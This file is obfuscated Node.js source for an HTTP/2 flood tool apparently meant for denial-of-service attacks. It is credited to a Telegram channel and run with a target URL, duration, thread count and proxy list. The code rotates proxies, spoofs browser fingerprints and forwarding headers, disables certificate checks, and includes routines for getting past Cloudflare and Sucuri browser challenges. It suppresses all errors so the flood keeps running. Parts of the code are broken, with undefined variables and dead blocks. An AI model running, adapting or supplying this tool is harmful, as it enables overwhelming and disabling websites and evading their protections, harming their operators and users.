const a = require("url");
const b = require("request");
const c = b.jar();
const d = require("fs");
const e = require("http2");
const f = require("http");
const g = require("tls");
const h = require("cluster");
const i = b.defaults({
  jar: c
});
const j = require("crypto");
const k = new Date();
const {
  promisify: l
} = require("util");
const m = k.toUTCString();
process.on("uncaughtException", () => {}).on("unhandledRejection", () => {}).setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
try {} catch (a) {
  console.log("[36mInstalling[37m the requirements");
  execSync("npm install colors");
  console.log("Done.");
  process.exit();
}
const n = ["same-origin", "same-site", "cross-site", "none"];
const o = ["text/plain", "text/html", "application/json", "application/xml", "multipart/form-data", "application/octet-stream", "image/jpeg", "image/png", "audio/mpeg", "video/mp4", "application/javascript", "application/pdf", "application/vnd.ms-excel", "application/vnd.ms-powerpoint", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/zip", "image/gif", "image/bmp", "image/tiff", "audio/wav", "audio/midi", "video/avi", "video/mpeg", "video/quicktime", "text/csv", "text/xml", "text/css", "text/javascript", "application/graphql", "application/x-www-form-urlencoded", "application/vnd.api+json", "application/ld+json", "application/x-pkcs12", "application/x-pkcs7-certificates", "application/x-pkcs7-certreqresp", "application/x-pem-file", "application/x-x509-ca-cert", "application/x-x509-user-cert", "application/x-x509-server-cert", "application/x-bzip", "application/x-gzip", "application/x-7z-compressed", "application/x-rar-compressed", "application/x-shockwave-flash"];
const p = ["Windows", "Windows Phone", "Macintosh", "Linux", "iOS", "Android", "PlayStation 4", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", "Roku", "Chromecast", "Smart TV", "Other"];
cplist = ["TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"];
const q = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9", "vi-VN,vi", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9"];
const r = ["navigate", "same-origin", "no-cors", "cors"];
const s = ["document", "sharedworker", "subresource", "unknown", "worker"];
encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity"];
const t = ["ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", "ecdsa_brainpoolP256r1tls13_sha256", "ecdsa_brainpoolP384r1tls13_sha384", "ecdsa_brainpoolP512r1tls13_sha512", "ecdsa_sha1", "ed25519", "ed448", "ecdsa_sha224", "rsa_pkcs1_sha1", "rsa_pss_pss_sha256", "dsa_sha256", "dsa_sha384", "dsa_sha512", "dsa_sha224", "dsa_sha1", "rsa_pss_pss_sha384", "rsa_pkcs1_sha2240", "rsa_pss_pss_sha512", "sm2sig_sm3", "ecdsa_secp521r1_sha512"];
let u = t.join(":");
const v = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5945.96 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5672.24 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/637.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/337.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.65 Safari/637.36"];
controle_header = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "TimeoutError", "JSONError", "URLError", "InvalidURL", "ProxyError"];
ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO", "EAI_AGAIN", "EHOSTDOWN", "ENETRESET", "ENETUNREACH", "ENONET", "ENOTCONN", "ENOTFOUND", "EAI_NODATA", "EAI_NONAME", "EADDRNOTAVAIL", "EAFNOSUPPORT", "EALREADY", "EBADF", "ECONNABORTED", "EDESTADDRREQ", "EDQUOT", "EFAULT", "EHOSTUNREACH", "EIDRM", "EILSEQ", "EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN", "EMFILE", "EMLINK", "EMSGSIZE", "ENAMETOOLONG", "ENETDOWN", "ENOBUFS", "ENODEV", "ENOENT", "ENOMEM", "ENOPROTOOPT", "ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY", "ENOTSOCK", "EOPNOTSUPP", "EPERM", "EPIPE", "EPROTONOSUPPORT", "ERANGE", "EROFS", "ESHUTDOWN", "ESPIPE", "ESRCH", "ETIME", "ETXTBSY", "EXDEV", "UNKNOWN", "DEPTH_ZERO_SELF_SIGNED_CERT", "UNABLE_TO_VERIFY_LEAF_SIGNATURE", "CERT_HAS_EXPIRED", "CERT_NOT_YET_VALID"];
function w() {
  const a = Math.floor(Math.random() * 256);
  const b = Math.floor(Math.random() * 256);
  const c = Math.floor(Math.random() * 256);
  const d = Math.floor(Math.random() * 256);
  return a + "." + b + "." + c + "." + d;
}
process.on("uncaughtException", function (a) {
  if (a.code && ignoreCodes.includes(a.code) || a.name && ignoreNames.includes(a.name)) {
    return false;
  }
}).on("unhandledRejection", function (a) {
  if (a.code && ignoreCodes.includes(a.code) || a.name && ignoreNames.includes(a.name)) {
    return false;
  }
}).on("warning", a => {
  if (a.code && ignoreCodes.includes(a.code) || a.name && ignoreNames.includes(a.name)) {
    return false;
  }
}).setMaxListeners(0);
const x = process.argv[2];
const y = process.argv[3];
const z = process.argv[4];
const A = process.argv[5];
let B = process.argv[6];
if (!x || !y || !z || !A || !B) {
  console.log("Bowlan | t.me/Bowlan_blog");
  console.error("Example: node " + process.argv[1] + " url time thread proxy.txt autorate");
  process.exit(1);
}
if (!/^https?:\/\//i.test(x)) {
  console.error("Only HTTPS");
  process.exit(1);
}
try {
  const a = d.readFileSync(A, "utf-8");
  proxys = a.match(/\S+/g) || [];
} catch (a) {
  console.error("Error proxy file:", a.message);
  process.exit(1);
}
const C = () => {
  return proxys[Math.floor(Math.random() * proxys.length)];
};
if (h.isMaster) {
  for (let a = 1; a <= z; a++) {
    h.fork();
  }
  setTimeout(() => process.exit(-1), y * 1000);
} else {
  setInterval(J);
}
function D(a, b) {
  a = a || {};
  a.headers = a.headers || {};
  makeRequest = H(a.method);
  if ("encoding" in a) {
    a.realEncoding = a.encoding;
  } else {
    a.realEncoding = "utf8";
  }
  a.encoding = null;
  if (!a.url || !b) {
    throw new Error("To perform request, define both url and callback");
  }
  a.headers["User-Agent"] = uas;
  makeRequest(a, function (c, d, e) {
    var f;
    var g;
    if (c || !e || !e.toString) {
      return b({
        errorType: 0,
        error: c
      }, e, d);
    }
    g = e.toString("utf8");
    if (f = E(c, g)) {
      return b(f, e, d);
    }
    if (g.indexOf("a = document.getElementById('jschl-answer');") !== -1) {
      setTimeout(function () {
        return F(d, g, a, b);
      }, Timeout);
    } else if (g.indexOf("Checking your browser before accessing") !== -1 || g.indexOf("sucuri_cloudproxy_js") !== -1 || g.indexOf("Verifying your browser, please wait...") !== -1) {
      G(d, g, a, b);
    } else {
      I(a, c, d, e, b);
    }
  });
}
function E(a, b) {
  var c;
  if (a) {
    return {
      errorType: 0,
      error: a
    };
  }
  if (b.indexOf("why_captcha") !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(b)) {
    return {
      errorType: 1
    };
  }
  c = b.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);
  if (c) {
    return {
      errorType: 2,
      error: parseInt(c[1])
    };
  }
  return false;
}
function F(a, b, c, d) {
  var e = b.match(/name="jschl_vc" value="(\w+)"/);
  var f = a.requests.host;
  var g = H(c.method);
  var h;
  var i;
  var j;
  if (!e) {
    return d({
      errorType: 3,
      error: "I cant extract challengeId (jschl_vc) from page"
    }, b, a);
  }
  h = e[1];
  e = b.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);
  if (!e) {
    return d({
      errorType: 3,
      error: "I cant extract method from setTimeOut wrapper"
    }, b, a);
  }
  challenge_pass = b.match(/name="pass" value="(.+?)"/)[1];
  e = e[1];
  e = e.replace(/a\.value =(.+?) \+ .+?;/i, "$1");
  e = e.replace(/\s{3,}[a-z](?: = |\.).+/g, "");
  e = e.replace(/'; \d+'/g, "");
  try {
    i = {
      jschl_vc: h,
      jschl_answer: eval(e) + a.request.host.length,
      pass: challenge_pass
    };
  } catch (c) {
    return d({
      errorType: 3,
      error: "Error occurred during evaluation: " + c.message
    }, b, a);
  }
  j = a.request.uri.protocol + "//" + f + "/cdn-cgi/l/chk_jschl";
  c.headers.referer = a.request.uri.href;
  c.url = j;
  c.qs = i;
  g(c, function (a, b, e) {
    if (a) {
      return d({
        errorType: 0,
        error: a
      }, b, e);
    }
    if (b.statusCode === 302) {
      c.url = b.headers.location;
      delete c.qs;
      g(c, function (a, b, e) {
        I(c, a, b, e, d);
      });
    } else {
      I(c, a, b, e, d);
    }
  });
}
function G(a, b, d, e) {
  var f = b.match(/S='([^']+)'/);
  var g = H(d.method);
  if (!f) {
    return e({
      errorType: 3,
      error: "I cant extract cookie generation code from page"
    }, b, a);
  }
  var h = f[1];
  var i = new Buffer(h, "base64").toString("ascii");
  var j = {
    location: {
      reload: function () {}
    },
    document: {}
  };
  vm.runInNewContext(i, j);
  try {
    c.setCookie(j.document.cookie, a.request.uri.href, {
      ignoreError: true
    });
  } catch (c) {
    return e({
      errorType: 3,
      error: "Error occurred during evaluation: " + c.message
    }, b, a);
  }
  g(d, function (a, b, c) {
    if (a) {
      return e({
        errorType: 0,
        error: a
      }, b, c);
    }
    I(d, a, b, c, e);
  });
}
function H(a) {
  a = a.toUpperCase();
  if (a === "POST") {
    return i.post;
  } else {
    return i.get;
  }
}
function I(a, b, c, d, e) {
  if (typeof a.realEncoding === "string") {
    d = d.toString(a.realEncoding);
    if (validationError = E(b, d)) {
      return e(validationError, c, d);
    }
  }
  e(b, c, d);
}
function J() {
  var b = a.parse(x);
  var c = C().split(":");
  var d = w();
  let h;
  if (B === "flood") {
    h = 500;
  } else if (B === "autorate") {
    function a(a, b) {
      return Math.floor(Math.random() * (b - a + 1)) + a;
    }
    h = a(100, 300);
    intervals = a(1, 24);
  } else {
    h = 300;
  }
  const i = ["text/html", "application/xhtml+xml", "application/xml", "image/avif", "image/webp", "image/apng", "/", "application/signed-exchange"];
  const k = [];
  i.forEach((a, b) => {
    const c = b === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
    k.push(a + ";q=" + c);
  });
  const n = k.join(",");
  function o(a) {
    const b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let c = "";
    const d = b.length;
    for (let e = 0; e < a; e++) {
      c += b.charAt(Math.floor(Math.random() * d));
    }
    return c;
  }
  function p(a) {
    const b = "0123456789";
    const c = b.length;
    const d = j.randomBytes(a);
    let e = "";
    for (let f = 0; f < a; f++) {
      const a = d[f] % c;
      e += b.charAt(a);
    }
    return e;
  }
  const q = p(25);
  function r(a) {
    const b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let c = "";
    const d = b.length;
    for (let e = 0; e < a; e++) {
      c += b.charAt(Math.floor(Math.random() * d));
    }
    return c;
  }
  const s = ["Windows NT 11", "Macintosh", "Windows NT 10.0", "Windows NT 6.3", "Windows NT 6.2", "Windows NT 6.1", "Windows NT 6.0", "Windows NT 5.2", "Windows NT 5.1", "Windows NT 5.0", "Macintosh", "Intel Mac OS X 15_2_0", "Intel Mac OS X 14_0_0", "Intel Mac OS X 13_5_1", "Intel Mac OS X 10_15_7", "Intel Mac OS X 11_0"];
  const t = {
    "Windows NT 11": "Win64; x64",
    Macintosh: "Intel Mac OS X 14_3_1",
    "Windows NT 11": "Win64; x64",
    "Windows NT 10": "Win64; x64",
    Macintosh: "Intel Mac OS X 14_3_1",
    Linux: "Linux x86_64; rv:109.0",
    Android: "Linux; Android 12; Pixel 6",
    iOS: "iPhone; CPU iPhone OS 15_0 like Mac OS X",
    BSD: "FreeBSD x86_64",
    SunOS: "SunOS i86pc",
    AIX: "AIX",
    "OS/2": "OS/2",
    "HP-UX": "HP-UX IA64",
    IRIX: "IRIX64",
    SymbianOS: "SymbianOS/9.4",
    BlackBerry: "BlackBerry9000",
    "Windows NT 6.3": "Win64; x64",
    "Windows NT 6.2": "Win64; x64",
    "Windows NT 6.1": "Win64; x64",
    "Windows NT 6.0": "Win64; x64",
    "Windows NT 5.1": "Win32",
    Macintosh: "Intel Mac OS X 14_3_1",
    Linux: "Linux x86_64; rv:109.0",
    Android: "Linux; Android 12; Pixel 6",
    iOS: "iPhone; CPU iPhone OS 15_0 like Mac OS X",
    BSD: "FreeBSD x86_64"
  };
  const y = ["Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0 Vivaldi/5.1", "Gecko/20100101 Firefox/32.0", "Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 ucbrowser/12.13.5.1209"];
  const z = {
    "Chrome/121.0.0.0 Safari/537.36 Edg/115.0.1901.203": "\"Microsoft Edge\";v=\"116\"",
    "Chrome/121.0.0.0 Safari/537.36 OPR/102.0.0.0": "\"Opera GX\";v=\"100\"",
    "Chrome/121.0.0.0 Safari/537.36": "\"Google Chrome\";v=\"116\"",
    "Version/16.5 Safari/605.1.15": "\"Safari\";v=\"15.0.0\", \"Chrome\";v=\"116\""
  };
  function A(a) {
    const b = Math.floor(Math.random() * a.length);
    return a[b];
  }
  const D = A(s);
  const E = t[D];
  const F = A(y);
  const G = "Mozilla/5.0 (" + D + ";" + E + ") " + F;
  const H = [{
    dnt: "1"
  }, {
    te: "trailers"
  }, {
    "content-type": "application/json"
  }, {
    referer: "https://" + b.host
  }, {
    "source-ip": o(6)
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "device-memory": "0.50"
  }, {
    forward: "for=" + d + ";proto=https;by=" + d
  }];
  const I = [{
    dnt: "1"
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "content-type": "application/xhtml+xml"
  }, {
    referer: "https://" + b.host
  }, {
    cookie: o(5) + "=" + o(5)
  },, {
    "viewport-width": "1920"
  }, {
    "device-memory": "0.25"
  }, {
    "user-agent": G
  }, {
    forward: "for=" + d + ";proto=https;by=" + d
  }];
  const J = [{
    "accept-patch": n
  }, {
    dnt: "1"
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "content-type": "image/jpeg"
  }, {
    referer: "https://" + b.host
  }, {
    cookie: o(5) + "=" + o(5)
  },, {
    "viewport-width": "1920"
  }, {
    "device-memory": "0.8"
  }, {
    "user-agent": G
  }, {
    forward: "for=" + d + ";proto=https;by=" + d
  }];
  var K = [{
    "x-aspnet-version": q
  }, {
    dnt: "1"
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "content-type": "image/png"
  }, {
    referer: "https://" + b.host
  }, {
    "user-agent": G
  }, {
    forward: "for=" + d + ";proto=https;by=" + d
  }];
  var L = [{
    "accept-charset": n
  }, {
    dnt: "1"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "viewport-width": "1900"
  }, {
    "sec-fetch-site": "same-site"
  }, {
    "sec-fetch-mode": "navigate"
  }, {
    "sec-fetch-user": "?1"
  }, {
    "sec-fetch-dest": "document"
  }, {
    "content-type": "application/xml"
  }, {
    referer: "https://" + b.host
  }, {
    cookie: o(5) + "=" + o(5)
  },, {
    "viewport-width": "3000"
  }, {
    "device-memory": "3"
  }, {
    "user-agent": G
  }, {
    forward: "for=" + d + ";proto=https;by=" + d
  }];
  const M = [{
    accept: n
  }, {
    ":scheme": "https"
  }, {
    "if-modified-since": m
  }, {
    te: "trailers"
  }];
  const N = ["\"Chromium\";v=\"119\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"119\""];
  const O = ["\"Chromium\";v=\"122\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"122\""];
  const P = ["\"Chromium\";v=\"121\", \"Not)A;Brand\";v=\"8\", \"Google Chrome\";v=\"121\""];
  const Q = ["\"Chromium\";v=\"120\", \"Not)A;Brand\";v=\"8\", \"Google Chrome\";v=\"120\""];
  const R = ["\"Chromium\";v=\"119\", \"Not)A;Brand\";v=\"8\", \"Google Chrome\";v=\"119\""];
  const S = ["\"Chromium\";v=\"118\", \"Not)A;Brand\";v=\"8\", \"Google Chrome\";v=\"118\""];
  const T = ["\"Chromium\";v=\"120.0.0.0 \", \"Not)A;Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"120.0.0.0 \""];
  const U = ["\"Chromium\";v=\"121.0.0.0 \", \"Not)A;Brand\";v=\"22.0.0.0\", \"Google Chrome\";v=\"121.0.0.0 \""];
  const V = ["\"Chromium\";v=\"122.0.0.0 \", \"Not)A;Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"122.0.0.0 \""];
  const W = ["\"Chromium\";v=\"118.0.5672.63\", \"Not)A;Brand\";v=\"21.0.0.0\", \"Google Chrome\";v=\"118.0.5672.63\""];
  const X = ["\"Chromium\";v=\"119.0.5615.49\", \"Not)A;Brand\";v=\"23.0.0.0\", \"Google Chrome\";v=\"119.0.5615.49\""];
  const Y = ["\"Chromium\";v=\"119.0.0.0\", \"Not)A;Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"119.0.0.0\""];
  function Z() {
    return v[Math.floor(Math.random() * v.length)];
  }
  let $;
  let _;
  let aa;
  function ba() {
    var a = Z();
    if (a === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36") {
      $ = N;
      _ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
      aa = T;
      sec4 = "171.0.5845.144";
    } else if (a === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Safari/537.36") {
      $ = O;
      _ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36";
      aa = U;
      sec4 = "116.0.5845.93";
    } else if (a === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.24 Safari/537.36") {
      $ = P;
      _ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
      aa = V;
      sec4 = "113.0.5672.25";
    } else if (a === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36") {
      $ = Q;
      _ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
      aa = W;
      sec4 = "118.0.5672.64";
    } else if (a === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36") {
      $ = R;
      _ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36";
      aa = X;
      sec4 = "42.0.5615.48";
    } else if (a === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.28 Safari/537.36") {
      $ = S;
      _ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";
      aa = Y;
      sec4 = "1.54.133.27";
    }
  }
  setInterval(async () => {
    ba();
  });
  ba();
  function ca(a, b) {
    const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const d = Math.floor(Math.random() * (b - a + 1)) + a;
    let e = "";
    for (let f = 0; f < d; f++) {
      const a = Math.floor(Math.random() * c.length);
      e += c[a];
    }
    return e;
  }
  hd = {};
  header = {
    ":method": "GET",
    ":authority": b.host,
    ":path": b.path,
    "user-agent": G
  };
  const da = new f.Agent({
    host: c[0],
    port: c[1],
    keepAlive: true,
    maxFreeSockets: Infinity,
    keepAliveMsecs: Infinity,
    maxSockets: Infinity,
    maxTotalSockets: Infinity
  });
  const ea = {
    agent: da,
    globalAgent: da,
    method: "CONNECT",
    path: b.host + ":443",
    timeout: 3000,
    freeSocketTimeout: 1000,
    headers: {
      Host: b.host,
      protocol: "http",
      "Proxy-Connection": "Keep-Alive",
      Connection: "Keep-Alive"
    }
  };
  connection = f.request(ea, () => {});
  const fa = {
    ciphers: "TLS-RSA-WITH-AES-128-GCM-SHA256:TLS-RSA-WITH-AES-256-GCM-SHA384:TLS-RSA-WITH-AES-128-CBC-SHA:TLS-RSA-WITH-AES-256-CBC-SHA:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    secureProtocol: ["TLSv1_2_method"],
    sigals: u,
    secureOptions: j.constants.SSL_OP_NO_RENEGOTIATION | j.constants.SSL_OP_NO_TICKET | j.constants.SSL_OP_NO_SSLv2 | j.constants.SSL_OP_NO_SSLv3 | j.constants.SSL_OP_NO_COMPRESSION | j.constants.SSL_OP_NO_RENEGOTIATION | j.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | j.constants.SSL_OP_TLSEXT_PADDING | j.constants.SSL_OP_ALL | j.constants.SSLcom | j.constants.SSL_OP_NO_RENEGOTIATION,
    echdCurve: ["X448", "X25519", "ed25519", "ed448", "dh", "ec", "dsa", "rsa-pss", "rsa", "secp256r1", "secp384r1"],
    secure: true,
    sessionTimeout: 3000,
    Compression: false,
    rejectUnauthorized: false,
    ALPNProtocols: ["h2", "http/1.1"]
  };
  function ga(a, b) {
    const c = g.connect({
      ...fa,
      host: a.host,
      port: 443,
      servername: a.host,
      socket: b
    });
    c.setKeepAlive(true, 6000000);
    return c;
  }
  function ha(a) {
    const b = a.getCipher();
    const c = a.getProtocol();
    if (!b) {
      console.error("Cipher info is not available. TLS handshake may not have completed.");
      return null;
    }
    const d = b.name + "-" + b.version + ":" + c + ":" + b.bits;
    const e = j.createHash("md5");
    e.update(d);
    return e.digest("hex");
  }
  connection.on("connect", function (a, c) {
    c.setKeepAlive(true, 6000000);
    const d = ga(b, c);
    const f = l(d.once).bind(d, "secureConnect");
    function g() {
      return new Promise(async (a, b) => {
        try {
          await f();
          const b = ha(d);
          a(b);
        } catch (a) {
          b(a);
        }
      });
    }
    async function i() {
      try {
        const a = await g();
        hd["ja3-fingerprint"] = a;
      } catch (a) {
        console.error("Error in main:", a);
      }
    }
    i();
    const j = e.connect(b.href, {
      createConnection: () => d,
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: true
      }
    });
    j.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false
    });
    j.on("connect", a => {
      setInterval(() => {
        const a = new Set([1040, 1009, 1012, 1015, 1020, 429, 1200, 409, 503, 502, 522, 521, 500, 1333, 1200, 1005, 1006, 1007, 1008]);
        for (let b = 0; b < intervals; b++) {
          const b = a => a[Math.floor(Math.random() * a.length)];
          const c = {
            ...header,
            ...b(J),
            ...b(I),
            ...b(K),
            ...b(M),
            ...b(L),
            ...b(H),
            ...b(hd)
          };
          const d = 200;
          if (a.has(d)) {
            return;
          }
          const e = j.request(c);
          e.end();
        }
      }, h);
    });
    const k = () => {
      j.close();
      d.end();
      c.end();
      return;
    };
    const m = () => {
      shouldPauseRequests = true;
      setTimeout(() => {
        shouldPauseRequests = true;
      }, 3000);
    };
    let n = "";
    j.on("data", a => {
      n += a;
    });
    j.on("socketError", a => {
      k();
    });
    j.on("timeout", () => {
      k();
    });
    j.on("goaway", a => {
      k();
    });
    j.on("close", () => {
      k();
    });
    j.on("error", a => {
      if (a.code === "ERR_HTTP2_GOAWAY_SESSION") {
        console.log("Received GOAWAY error, pausing requests for 10 seconds\r");
        shouldPauseRequests = true;
      } else if (a.code === "ECONNRESET") {
        m();
      } else {
        const b = a.response ? a.response.statusCode : null;
        if (b >= 520 && b <= 529) {
          console.log("HTTP Error " + b + " in the range 520-529. Pausing requests for a while\r");
          m();
        } else if (b >= 531 && b <= 539) {
          console.log("HTTP Error " + b + " in the range 531-539. Handling this error\r");
        }
      }
    });
  });
  const ia = () => {
    connection.destroy();
  };
  connection.on("error", a => {
    ia();
    if (a) {
      return;
    }
  });
  connection.on("close", a => {
    ia();
    if (a) {
      return;
    }
  });
  connection.on("goway", a => {
    ia();
    if (a) {
      return;
    }
  });
  connection.on("timeout", () => {
    ia();
    return;
  });
  connection.end();
}
